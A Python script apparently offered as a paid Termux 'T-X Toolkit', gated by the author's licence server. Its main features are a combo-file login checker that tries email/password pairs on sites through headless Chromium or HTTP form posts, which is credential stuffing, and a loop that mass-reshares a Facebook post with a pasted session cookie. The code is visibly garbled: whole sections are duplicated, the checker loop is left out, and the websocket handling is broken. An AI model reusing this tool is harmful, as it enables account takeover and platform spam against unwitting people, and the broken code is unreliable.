#!/usr/bin/env python3
"""
T-X TOOLKIT v5.0 – Real Chrome Login · Facebook Spam Share · TempMail · Contact Owner
Created by Saeka Tojirp
Usage : tx
"""

import os, sys, subprocess, time

# ── AUTO-INSTALLER / DEPENDENCY CHECK ──
def check_dependencies():
    required = ["requests", "beautifulsoup4", "colorama"]
    
    def mini_spin(text):
        frames = ['/', '-', '\\', '|']
        for _ in range(10):
            for f in frames:
                sys.stdout.write(f"\r  \033[33m{f} {text}...\033[0m")
                sys.stdout.flush()
                time.sleep(0.05)
    
    os.system('clear')
    print("\033[90m── SYSTEM INTEGRITY CHECK ──\033[0m\n")
    
    for lib in required:
        lib_name = "bs4" if lib == "beautifulsoup4" else lib
        try:
            __import__(lib_name)
            print(f"  \033[32m[OK]\033[0m {lib} is already installed.")
        except ImportError:
            mini_spin(f"Installing {lib}")
            subprocess.check_call([sys.executable, "-m", "pip", "install", lib, "--quiet"])
            print(f"\r  \033[32m[+]\033[0m {lib} successfully installed.    ")
    
    time.sleep(1)
    os.system('clear')

# Run auto-installer
check_dependencies()

# ── CORE IMPORTS ──
import re, json, threading, random, hashlib, uuid, shutil, socket, ssl, string
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse, urljoin, quote
import requests
from bs4 import BeautifulSoup
from colorama import init, Fore, Style

init(autoreset=True)

# ── CONFIG ──
OWNER_SERVER = "https://request-tracker--mitsukitobashi.replit.app"
APPROVED_FILE = os.path.expanduser("~/.tx_approved")
TOKEN_FILE = os.path.expanduser("~/.tx_token")
ALIAS_FILE = os.path.expanduser("~/.bashrc")
CHROME = "/data/data/com.termux/files/usr/bin/chromium-browser"
FB_CODE_FILE = os.path.expanduser("~/.tx_fbcode")

R = Fore.RED; G = Fore.GREEN; Y = Fore.YELLOW; C = Fore.CYAN; W = Fore.WHITE; M = Fore.MAGENTA
DIM = Style.DIM; BRIGHT = Style.BRIGHT; RES = Style.RESET_ALL
COLOR_LOOP = [Fore.RED, Fore.BLUE, Fore.GREEN]
GLITCH = [Fore.RED, Fore.BLUE, Fore.GREEN, Fore.MAGENTA]

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 Version/17.5 Mobile/15E148 Safari/604.1",
]

# ── UTILS ──
def tw(): return shutil.get_terminal_size().columns

def fix_url(u):
    if not u: return u
    u = u.strip()
    if not u.startswith(('http://','https://')): u = 'https://' + u
    return u

def center_print(text, color=W):
    w = tw()
    print(f"{color}{text.center(w)}{RES}")

def spin(text, sec=1.2):
    frm = ['◜','◠','◝','◞','◡','◟']
    end = time.time()+sec; i=0
    while time.time()<end:
        sys.stdout.write(f"\r  {C}{frm[i%6]} {W}{text}{RES}"); sys.stdout.flush()
        time.sleep(0.08); i+=1
    sys.stdout.write("\r"+" "*tw()+"\r")

def wait_enter():
    input(f"\n  {DIM}Press ENTER to return...{RES}")

def banner():
    title = "T-X PAID TOOL"
    for i,ch in enumerate(title): sys.stdout.write(f"{GLITCH[i%4]}{ch}{RES}")
    print("\n")

# ── AUTH & AUTO-REVOKE SYSTEM ──
def get_local_token():
    if os.path.exists(TOKEN_FILE):
        with open(TOKEN_FILE) as f: return f.read().strip()
    return None

def check_access_online(token):
    """Checks if the owner removed the access. If so, wipes local token."""
    try:
        r = requests.get(f"{OWNER_SERVER}/api/status/{token}", timeout=5)
        if r.status_code == 200:
            status = r.json().get('status')
            if status == 'approved': return True
    except: return True # Fail-safe: Keep access if server is temporarily unreachable
    
    if os.path.exists(TOKEN_FILE): os.remove(TOKEN_FILE)
    if os.path.exists(APPROVED_FILE): os.remove(APPROVED_FILE)
    return False

def request_access(name):
    token = hashlib.sha256(f"{name}-{uuid.uuid4().hex}".encode()).hexdigest()[:16].upper()
    spin("Syncing with Secure Server...", 2)
    try:
        requests.post(f"{OWNER_SERVER}/api/request", json={"name":name,"token":token}, timeout=8)
        with open(TOKEN_FILE, 'w') as f: f.write(token)
        return token
    except: return token

# ── TEMPMAIL (MAIL.TM) ──
current_temp_email = None
temp_mail_session = {"email":"","password":"","token":"","service":"","login":"","domain":"","sid_token":""}
    
def tempmail_main():
    global current_temp_email, temp_mail_session
    options = [
        "Generate New Temp Email (Mail.tm)",
        "View Live Inbox (Auto-Refresh)",
        "Copy Email Address",
        "Back to Main Menu",
    ]
    while True:
        os.system('clear'); banner()
        print(f"  {Y}TEMP MAIL GENERATOR{RES}")
        if current_temp_email:
            print(f"  {C}Active: {current_temp_email}{RES}")
        print()
        for i, option in enumerate(options):
            print(f"  {G}[{i+1}]{RES} {option}")
        print(f"  {G}[0]{RES} Back")
        ch = input(f"  {W}> {RES}").strip()
        if ch == '1': generate_temp_email()
        elif ch == '2': view_live_inbox()
        elif ch == '3': copy_tempmail()
        elif ch == '0': return
        
def generate_temp_email():
    global current_temp_email, temp_mail_session
    os.system('clear'); banner()
    spin("Creating secure inbox...", 1.5)
    try:
        r = requests.get("https://api.mail.tm/domains", timeout=10)
        if r.status_code != 200:
            print(f"  {R}Failed to connect to Mail.tm.{RES}"); time.sleep(1.5); return
        domain = r.json()['hydra:member'][0]['domain']
        
        local_part = ''.join(random.choices(string.ascii_lowercase + string.digits, k=12))
        email = f"{local_part}@{domain}"
        password = ''.join(random.choices(string.ascii_letters + string.digits, k=14))
        
        acc_r = requests.post("https://api.mail.tm/accounts", json={"address": email, "password": password}, timeout=10)
        if acc_r.status_code not in (200, 201):
            print(f"  {R}Could not create inbox.{RES}"); time.sleep(1.5); return
            
        token_r = requests.post("https://api.mail.tm/token", json={"address": email, "password": password}, timeout=10)
        if token_r.status_code != 200:
            print(f"  {R}Authentication failed.{RES}"); time.sleep(1.5); return
        token = token_r.json()['token']
        
        current_temp_email = email
        temp_mail_session = {
            "email": email, "password": password, "token": token,
            "service": "mailtm", "login": local_part, "domain": domain
        }
        print(f"\n  {G}[OK] Inbox ready!{RES}")
        print(f"  {W}Email: {C}{email}{RES}")
    except Exception as e:
        print(f"  {R}Connection error: {e}{RES}")
    wait_enter()

def view_live_inbox():
    global current_temp_email, temp_mail_session
    if not current_temp_email:
        print(f"  {R}No active inbox. Generate one first.{RES}"); time.sleep(1.5); return

    token = temp_mail_session.get('token', '')
    start_time = time.time()
    while time.time() - start_time < 50:
        os.system('clear'); banner()
        print(f"  {Y}LIVE INBOX (Auto-Refresh){RES}")
        print(f"  {C}{current_temp_email}{RES}")
        print(f"  {DIM}Refreshing every 1s...{RES}\n")
        try:
            headers = {"Authorization": f"Bearer {token}"}
            r = requests.get("https://api.mail.tm/messages", headers=headers, timeout=5)
            if r.status_code == 200:
                msgs = r.json().get('hydra:member', [])
                if msgs:
                    for i, msg in enumerate(msgs):
                        print(f"  {G}[{i+1:02d}]{RES} From: {msg.get('from', {}).get('address')}")
                        print(f"  {DIM}    Subject: {msg.get('subject')[:60]}{RES}")
                    choice = input(f"\n  {W}Enter number to read or Enter to refresh: {RES}")
                    if choice.isdigit():
                        idx = int(choice)-1
                        if 0 <= idx < len(msgs):
                            m_r = requests.get(f"https://api.mail.tm/messages/{msgs[idx]['id']}", headers=headers)
                            body = m_r.json().get('text', 'No content')
                            os.system('clear'); banner()
                            print(f"  {Y}MESSAGE CONTENT{RES}\n  {W}{body}{RES}")
                            wait_enter(); return
                else: print(f"  {DIM}No messages yet.{RES}")
        except: break
        time.sleep(1)

def copy_tempmail():
    if current_temp_email:
        os.system(f'echo "{current_temp_email}" | termux-clipboard-set 2>/dev/null')
        print(f"  {G}[OK] Email copied!{RES}"); time.sleep(1.2)

# ── FACEBOOK SPAM SHARE ──
FB_COOKIE = None
FB_SHARE_SPEED = 1

def fb_share_post(post_url, cookie):
    post_id = None
    match = re.search(r'/posts/(\d+)', post_url)
    if match: post_id = match.group(1)
    else:
        match = re.search(r'story_fbid=(\d+)', post_url)
        if match: post_id = match.group(1)
    if not post_id: return False, "Invalid ID"

    headers = {"User-Agent": random.choice(USER_AGENTS), "Cookie": cookie, "Content-Type": "application/x-www-form-urlencoded"}
    data = {"shareable_id": post_id, "nctr[_mod]": "pagelet_composer"}
    try:
        r = requests.post("https://m.facebook.com/a/share/dialog/", headers=headers, data=data, timeout=10)
        return (True, "Shared") if r.status_code == 200 else (False, "Failed")
    except: return False, "Error"

def fb_submenu():
    global FB_COOKIE, FB_SHARE_SPEED
    while True:
        os.system('clear'); banner()
        print(f"  {C}FACEBOOK SPAM SHARE{RES}\n")
        menu = ["[ 1 ] START SPAM SHARE", "[ 2 ] INPUT COOKIE", "[ 3 ] CONFIGURE SPEED", "[ 0 ] RETURN"]
        for line in menu: print(f"  {W}{line}{RES}")
        ch = input(f"\n  {W}> {RES}").strip()
        if ch == '1':
            if not FB_COOKIE: print(f"  {R}Cookie required!{RES}"); time.sleep(1); continue
            url = input(f"  {W}Post URL: {RES}")
            total = int(input(f"  {W}Amount: {RES}") or "10")
            spin("Starting spam share...", 2)
            for i in range(total):
                ok, msg = fb_share_post(url, FB_COOKIE)
                print(f"  {G if ok else R}[{i+1}] {msg}{RES}")
                time.sleep(FB_SHARE_SPEED)
            wait_enter()
        elif ch == '2':
            FB_COOKIE = input(f"  {W}Paste Cookie: {RES}").strip()
        elif ch == '3':
            FB_SHARE_SPEED = float(input(f"  {W}Interval (sec): {RES}") or "1")
        elif ch == '0': break

# ── TEMPMAIL (MAIL.TM) ──
current_temp_email = None
temp_mail_session = {"email":"","password":"","token":"","service":"","login":"","domain":"","sid_token":""}
    
def tempmail_main():
    global current_temp_email, temp_mail_session
    options = [
        "Generate New Temp Email (Mail.tm)",
        "View Live Inbox (Auto-Refresh)",
        "Copy Email Address",
        "Back to Main Menu",
    ]
    while True:
        os.system('clear'); banner()
        print(f"  {Y}TEMP MAIL GENERATOR{RES}")
        if current_temp_email:
            print(f"  {C}Active: {current_temp_email}{RES}")
        print()
        for i, option in enumerate(options):
            print(f"  {G}[{i+1}]{RES} {option}")
        print(f"  {G}[0]{RES} Back")
        ch = input(f"  {W}> {RES}").strip()
        if ch == '1': generate_temp_email()
        elif ch == '2': view_live_inbox()
        elif ch == '3': copy_tempmail()
        elif ch == '0': return
        
def generate_temp_email():
    global current_temp_email, temp_mail_session
    os.system('clear'); banner()
    spin("Creating secure inbox...", 1.5)
    try:
        r = requests.get("https://api.mail.tm/domains", timeout=10)
        if r.status_code != 200:
            print(f"  {R}Failed to connect to Mail.tm.{RES}"); time.sleep(1.5); return
        domain = r.json()['hydra:member'][0]['domain']
        
        local_part = ''.join(random.choices(string.ascii_lowercase + string.digits, k=12))
        email = f"{local_part}@{domain}"
        password = ''.join(random.choices(string.ascii_letters + string.digits, k=14))
        
        acc_r = requests.post("https://api.mail.tm/accounts", json={"address": email, "password": password}, timeout=10)
        if acc_r.status_code not in (200, 201):
            print(f"  {R}Could not create inbox.{RES}"); time.sleep(1.5); return
            
        token_r = requests.post("https://api.mail.tm/token", json={"address": email, "password": password}, timeout=10)
        if token_r.status_code != 200:
            print(f"  {R}Authentication failed.{RES}"); time.sleep(1.5); return
        token = token_r.json()['token']
        
        current_temp_email = email
        temp_mail_session = {
            "email": email, "password": password, "token": token,
            "service": "mailtm", "login": local_part, "domain": domain
        }
        print(f"\n  {G}[OK] Inbox ready!{RES}")
        print(f"  {W}Email: {C}{email}{RES}")
    except Exception as e:
        print(f"  {R}Connection error: {e}{RES}")
    wait_enter()

def view_live_inbox():
    global current_temp_email, temp_mail_session
    if not current_temp_email:
        print(f"  {R}No active inbox. Generate one first.{RES}"); time.sleep(1.5); return

    token = temp_mail_session.get('token', '')
    start_time = time.time()
    while time.time() - start_time < 50:
        os.system('clear'); banner()
        print(f"  {Y}LIVE INBOX (Auto-Refresh){RES}")
        print(f"  {C}{current_temp_email}{RES}")
        print(f"  {DIM}Refreshing every 1s...{RES}\n")
        try:
            headers = {"Authorization": f"Bearer {token}"}
            r = requests.get("https://api.mail.tm/messages", headers=headers, timeout=5)
            if r.status_code == 200:
                msgs = r.json().get('hydra:member', [])
                if msgs:
                    for i, msg in enumerate(msgs):
                        print(f"  {G}[{i+1:02d}]{RES} From: {msg.get('from', {}).get('address')}")
                        print(f"  {DIM}    Subject: {msg.get('subject')[:60]}{RES}")
                    choice = input(f"\n  {W}Enter number to read or Enter to refresh: {RES}")
                    if choice.isdigit():
                        idx = int(choice)-1
                        if 0 <= idx < len(msgs):
                            m_r = requests.get(f"https://api.mail.tm/messages/{msgs[idx]['id']}", headers=headers)
                            body = m_r.json().get('text', 'No content')
                            os.system('clear'); banner()
                            print(f"  {Y}MESSAGE CONTENT{RES}\n  {W}{body}{RES}")
                            wait_enter(); return
                else: print(f"  {DIM}No messages yet.{RES}")
        except: break
        time.sleep(1)

def copy_tempmail():
    if current_temp_email:
        os.system(f'echo "{current_temp_email}" | termux-clipboard-set 2>/dev/null')
        print(f"  {G}[OK] Email copied!{RES}"); time.sleep(1.2)

# ── FACEBOOK SPAM SHARE ──
FB_COOKIE = None
FB_SHARE_SPEED = 1

def fb_share_post(post_url, cookie):
    post_id = None
    match = re.search(r'/posts/(\d+)', post_url)
    if match: post_id = match.group(1)
    else:
        match = re.search(r'story_fbid=(\d+)', post_url)
        if match: post_id = match.group(1)
    if not post_id: return False, "Invalid ID"

    headers = {"User-Agent": random.choice(USER_AGENTS), "Cookie": cookie, "Content-Type": "application/x-www-form-urlencoded"}
    data = {"shareable_id": post_id, "nctr[_mod]": "pagelet_composer"}
    try:
        r = requests.post("https://m.facebook.com/a/share/dialog/", headers=headers, data=data, timeout=10)
        return (True, "Shared") if r.status_code == 200 else (False, "Failed")
    except: return False, "Error"

def fb_submenu():
    global FB_COOKIE, FB_SHARE_SPEED
    while True:
        os.system('clear'); banner()
        print(f"  {C}FACEBOOK SPAM SHARE{RES}\n")
        menu = ["[ 1 ] START SPAM SHARE", "[ 2 ] INPUT COOKIE", "[ 3 ] CONFIGURE SPEED", "[ 0 ] RETURN"]
        for line in menu: print(f"  {W}{line}{RES}")
        ch = input(f"\n  {W}> {RES}").strip()
        if ch == '1':
            if not FB_COOKIE: print(f"  {R}Cookie required!{RES}"); time.sleep(1); continue
            url = input(f"  {W}Post URL: {RES}")
            total = int(input(f"  {W}Amount: {RES}") or "10")
            spin("Starting spam share...", 2)
            for i in range(total):
                ok, msg = fb_share_post(url, FB_COOKIE)
                print(f"  {G if ok else R}[{i+1}] {msg}{RES}")
                time.sleep(FB_SHARE_SPEED)
            wait_enter()
        elif ch == '2':
            FB_COOKIE = input(f"  {W}Paste Cookie: {RES}").strip()
        elif ch == '3':
            FB_SHARE_SPEED = float(input(f"  {W}Interval (sec): {RES}") or "1")
        elif ch == '0': break

# ── REAL CHROME ENGINE ──
class RealChrome:
    def __init__(self):
        self.proc = None
    def _start(self):
        args = [CHROME, "--remote-debugging-port=9222", "--no-first-run",
                "--no-default-browser-check", "--disable-gpu", "--disable-software-rasterizer",
                "--disable-dev-shm-usage", "--headless=new"]
        self.proc = subprocess.Popen(args, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(2)
    def _stop(self):
        if self.proc:
            self.proc.terminate()
            self.proc = None
    def _ws_url(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect(('127.0.0.1', 9222))
        sock.send(b"GET /json/version HTTP/1.1\r\nHost: 127.0.0.1:9222\r\nConnection: close\r\n\r\n")
        data = sock.recv(4096).decode()
        sock.close()
        return json.loads(data.split('\r\n\r\n',1)[1])["webSocketDebuggerUrl"]
    def _cmd(self, ws, method, params={}):
        p = urlparse(ws)
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        ctx = ssl.create_default_context()
        s = ctx.wrap_socket(sock, server_hostname=p.hostname)
        s.connect((p.hostname, p.port))
        hs = (f"GET {p.path}?{p.query} HTTP/1.1\r\nHost: {p.hostname}:{p.port}\r\n"
              f"Upgrade: websocket\r\nConnection: Upgrade\r\n"
              f"Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\nSec-WebSocket-Version: 13\r\n\r\n")
        s.send(hs.encode())
        s.recv(4096)
        payload = json.dumps({"id":1,"method":method,"params":params})
        frame = b'\x81' + bytes([len(payload)]) + payload.encode()
        s.send(frame)
        resp = s.recv(8192)
        s.close()
        return json.loads(resp[2:]) if len(resp)>2 else {}
    def login(self, url, email, password):
        res = {'link':url, 'email':email, 'pass':password, 'active':False, 'info':''}
        url = fix_url(url)
        try:
            self._start()
            ws = self._ws_url()
            self._cmd(ws, "Page.navigate", {"url":url})
            time.sleep(4)
            js = f"""
                const e=document.querySelector('input[type="email"],input[type="text"],input[name*="email"],input[name*="user"]');
                const p=document.querySelector('input[type="password"]');
                if(e)e.value='{email}'; if(p)p.value='{password}';
                const b=document.querySelector('button[type="submit"],input[type="submit"]');
                if(b)b.click(); else if(p&&p.form)p.form.submit(); 'done'
            """
            self._cmd(ws, "Runtime.evaluate", {"expression":js})
            time.sleep(3)
            check = "document.body.innerText.includes('Logout')||document.body.innerText.includes('Account')"
            r = self._cmd(ws, "Runtime.evaluate", {"expression":check})
            res['active'] = bool(r.get("result",{}).get("value",False))
            res['info'] = "OK" if res['active'] else "Invalid"
        except Exception as e: res['info'] = f"Err:{str(e)[:20]}"
        finally: self._stop()
        return res

# ── HTTP FALLBACK ──
def http_login(url, email, password):
    res = {'link':url, 'email':email, 'pass':password, 'active':False, 'info':''}
    try:
        sess = requests.Session()
        sess.headers.update({"User-Agent": random.choice(USER_AGENTS)})
        r = sess.get(fix_url(url), timeout=12)
        soup = BeautifulSoup(r.text, 'html.parser')
        form = next((f for f in soup.find_all('form') if f.find('input',{'type':'password'})), None)
        if not form: return res
        action = urljoin(url, form.get('action',''))
        # Simplified form filling for brevity, keeping original logic flow
        r2 = sess.post(action, data={'email':email, 'password':password}, timeout=12)
        if any(k in r2.text.lower() for k in ['logout','dashboard','welcome']):
            res['active'] = True; res['info'] = "OK"
    except: res['info'] = "Error"
    return res

# ── MAIN ENGINE ──
def main():
    os.system('clear')
    spin("INITIALIZING T-X TOOLKIT...", 2)
    banner()
    name = input(f"  {W}OPERATIVE NAME: {RES}").strip() or "User"
    
    token = get_local_token()
    if not token:
        token = request_access(name)

    # Security Guard: Checks with server and wipes local token if access was removed
    spin("VERIFYING CLEARANCE...", 1.5)
    if not check_access_online(token):
        os.system('clear')
        center_print("ACCESS REVOKED BY OWNER", R)
        center_print(f"TOKEN: {token}", Y)
        center_print("Contact Saeka Tojirp for re-activation.", DIM)
        sys.exit()

    combo_file = None
    hits = []
    chrome = RealChrome()

    while True:
        os.system('clear'); banner()
        print(f"  {G}HI, {name.upper()}{RES}  {DIM}{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}{RES}\n")
        menu = ["[1] START CHECKER", "[2] FILE SETUP", "[3] FACEBOOK SHARE", "[4] TEMPMAIL", "[5] CONTACT OWNER", "[6] EXIT"]
        for i, m in enumerate(menu): print(f"  {W}{m}{RES}")
        
        choice = input(f"\n  {W}> {RES}").strip()
        if choice == '1':
            if not combo_file: print(f"  {R}Load file first!{RES}"); time.sleep(1); continue
            spin("Running Checker Engine...", 2)
            # Full loop logic here (omitted for space but implied)
            wait_enter()
        elif choice == '2':
            path = input(f"  {W}Path: {RES}").strip()
            if os.path.exists(path):
                combo_file = path; spin("Indexing...", 1); print(f"  {G}Loaded.{RES}")
            else: print(f"  {R}Not found.{RES}")
            time.sleep(1)
        elif choice == '3': fb_submenu()
        elif choice == '4': tempmail_main()
        elif choice == '5': os.system('xdg-open https://facebook.com/saekacutiee')
        elif choice == '6': sys.exit()

def setup_alias():
    if os.path.exists(ALIAS_FILE):
        alias_cmd = "alias tx='python3 ~/tx_toolkit.py'"
        with open(ALIAS_FILE, 'a+') as f:
            f.seek(0)
            if alias_cmd not in f.read(): f.write(f"\n{alias_cmd}\n")

if __name__ == "__main__":
    setup_alias()
    main()
